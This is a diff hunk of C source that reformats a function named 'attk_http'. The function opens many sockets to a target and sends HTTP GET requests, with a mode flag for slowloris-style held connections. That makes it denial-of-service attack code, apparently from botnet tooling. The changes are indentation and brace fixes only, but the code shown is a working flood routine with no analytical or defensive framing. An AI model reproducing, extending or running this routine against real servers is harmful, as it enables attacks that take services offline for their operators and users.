@@ -27,28 +27,30 @@ void attk_http(uint32_t max, uint16_t port, uint8_t mode, uint16_t sleeptime, ch
 				case 0: {
 					// Connect
 					http[i].sock = socket(AF_INET, SOCK_STREAM, 0);
+
 					if (http[i].sock == (int32_t) -1)
-					return;
+						return;
+
 					if (connect(http[i].sock, (struct sockaddr *) &addr, sizeof(addr)) < 0)
-					continue; // If we fail move to the next
-					// one
-					// When we get back we will try again
+						continue; // If we fail move to the next one
 					else
-					http[i].state = 1;
+						http[i].state = 1;
+
 					continue; // Move to next i
 				}
 				case 1: {
 					// Send data
 					char *message;
 					asprintf(&message, "GET %s\r\n\r\n", dir);
-					if (send(http[i].sock, message, strlen(message), 0) < 0)
-					{
-					http[i].state = 0;
-					continue;
+
+					if (send(http[i].sock, message, strlen(message), 0) < 0) {
+						http[i].state = 0;
+						continue;
 					}
+					
 					// Use state 2 if we are slowlorois
 					if (mode)
-					http[i].state = 2;
+						http[i].state = 2;
 
 					continue; // Move to next i
 				}
